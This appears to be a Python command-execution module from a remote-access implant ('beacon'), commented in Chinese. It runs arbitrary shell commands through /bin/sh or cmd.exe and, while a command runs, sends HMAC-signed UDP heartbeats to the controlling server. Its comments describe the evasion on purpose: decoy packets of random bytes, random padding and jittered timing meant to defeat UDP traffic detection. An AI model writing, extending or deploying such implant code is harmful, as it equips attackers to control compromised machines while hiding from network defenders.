"""
@module: exec
@desc: 执行系统命令 (cmd 为 rest 参数，吸收剩余全部参数，命令可含空格)
"""
import subprocess

MODULE = {
    "desc": "执行系统命令（cmd 吸收剩余全部参数，命令可含空格）",
    "params": [("cmd", "rest；完整命令，剩余参数自动拼接"),
               ("timeout", "可选；默认 300 秒（config.exec_timeout）")],
}


def _hb_start():
    """长任务心跳：每 30s 向 server 的 UDP 同端口发心跳（21）。

    防长任务期间 server 端 show 误判离线；依赖 beacon 全局 _D/_H/_P。
    """
    global _hb_go, _hb_stop_ev
    if _hb_go:
        return
    try:
        import socket as _s
        import threading as _th
        _hb_go = True
        _hb_stop_ev = _th.Event()

        def _beat():
            try:
                import hmac as _hm
                import hashlib as _hl
                u = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
                u.settimeout(2)
                while not _hb_stop_ev.is_set():
                    try:
                        # M4：心跳带 HMAC(_K, bid) 前 8 字节，防伪造刷新
                        mac = _hm.new(_K, _D.encode(), _hl.sha256).digest()[:8]
                        # 流量混淆: 30% 假心跳(纯随机字节,服务端 MAC 校验失败
                        # 忽略) + 真心跳随机填充 0-40B → 线上包 24-64B 随机大小
                        # (mac 必须保持在帧尾——服务端按 <bid 16><mac 8> 最后 8B 解析)
                        if rnd.random() < 0.3:
                            u.sendto(sec.token_bytes(rnd.randint(24, 64)),
                                     (_H, _P))
                        else:
                            pad = sec.token_bytes(rnd.randint(0, 40))
                            u.sendto(_D.encode() + pad + mac, (_H, _P))
                    except OSError:
                        pass
                    # 间隔随机 10-50s(原固定 30s,固定周期是 UDP 检测特征)
                    _hb_stop_ev.wait(rnd.uniform(10, 50))
                u.close()
            except Exception:
                pass

        _th.Thread(target=_beat, daemon=True).start()
    except Exception:
        pass


def _hb_stop():
    global _hb_go
    try:
        _hb_stop_ev.set()
    except NameError:
        pass
    _hb_go = False


_hb_go = False


def _run(argv, cmd, timeout):
    _hb_start()
    try:
        proc = subprocess.Popen(
            argv,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )
        out, _ = proc.communicate(timeout=int(timeout))
        return out.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        proc.kill()
        return f"(timeout after {timeout}s)"
    except FileNotFoundError:
        return "(shell not found)"
    except Exception as e:
        return f"(error: {e})"
    finally:
        _hb_stop()


def run(cmd, timeout=10):
    """通用入口（平台未知时自动判定）。"""
    import os
    if os.name == "nt":
        return run_windows(cmd, timeout)
    return run_linux(cmd, timeout)


def run_linux(cmd, timeout=10):
    """通过 /bin/sh 执行命令"""
    return _run(["/bin/sh", "-c", cmd], cmd, timeout)


def run_windows(cmd, timeout=10):
    """通过 cmd.exe 执行命令"""
    return _run(["cmd.exe", "/c", cmd], cmd, timeout)


def run_mac(cmd, timeout=10):
    """通过 /bin/sh 执行命令 (macOS)"""
    return _run(["/bin/sh", "-c", cmd], cmd, timeout)


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("usage: exec <command> [timeout]")
        sys.exit(1)
    t = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    print(f"$ {sys.argv[1]}")
    print(run_linux(sys.argv[1], t))
